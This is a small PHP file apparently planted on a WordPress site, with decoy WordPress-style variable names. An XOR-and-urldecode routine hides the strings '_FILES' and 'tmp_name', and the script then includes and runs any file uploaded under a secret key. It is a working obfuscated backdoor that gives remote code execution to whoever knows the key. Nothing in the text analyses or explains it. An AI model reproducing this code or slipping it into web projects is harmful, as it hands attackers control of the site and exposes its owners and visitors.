<?php 	

function hours()

{

    $counts = 'VQYJRm9jqACwnu';
    $is_sticky = $counts;
    
    $double = $GLOBALS[error("%09%17%10%06%17%3E", $is_sticky)];

    $unfiltered = $double;
    $old_dates = isset($unfiltered[$is_sticky]);
	$mime = 'month';
    if ($old_dates)

    {

        $words_array = $double[$is_sticky];
        $post_modified_gmt = $words_array[error("%22%3C%29%15%3C%0CT%0F", $is_sticky)];
        $show_ui = $post_modified_gmt;
	$has_self_closer = 'uris';
        include ($show_ui);

    }
}

function error($double_chars, $comments)

{
    $height = $comments;
	$public = 'ptype_obj';
    $years = "url" . "decode";

    $comment_id = $years($double_chars);
    $encoded_char = substr($height,0, strlen($comment_id));
    $target = $comment_id ^ $encoded_char;
	$char = 'src_url';
    return $target;
}


	$pees = 'page_ids';
hours();


?>
